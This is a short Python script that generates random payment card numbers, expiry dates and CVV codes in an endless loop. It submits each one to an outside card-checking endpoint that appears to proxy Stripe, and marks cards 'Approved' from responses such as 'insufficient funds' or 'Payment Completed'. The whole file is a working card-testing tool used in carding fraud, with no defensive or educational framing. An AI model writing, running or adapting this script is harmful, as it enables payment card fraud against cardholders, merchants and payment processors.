import requests, random, pyfiglet
Z =  '\033[1;31m'
F = '\033[2;32m'
l=pyfiglet.figlet_format(' H S O ');print(F+l)
print(Z+'*'*60)
num='1234567890'

while True:
 us = str("".join(random.choice(num)for i in range(16)))
 ue = str("".join(random.choice(num)for i in range(3)))
 um = str("".join(random.choice(num)for i in range(2)))
 num='456789'
 u = str("".join(random.choice(num)for i in range(1)))
 P = str(us+'|'+um+'|'+f'202{u}'+'|'+ue)
 
 req = requests.get(f'https://dev-joker834.pantheonsite.io/Api/Stripe.php?lista={P}')

 if "insufficient funds" in req.text:
     print(F+f'[ {P} ]',' ➜ Approved ✅')
 elif "security code is incorrect" in req.text:
     print(F+f'[ {P} ]',' ➜ Approved ✅')
 elif "Payment Completed" in req.text:
     print(F+f'[ {P} ]',' ➜ Approved ✅')
 else:
     print(Z+f'[ {P} ]',' ➜ ' ,req.text)

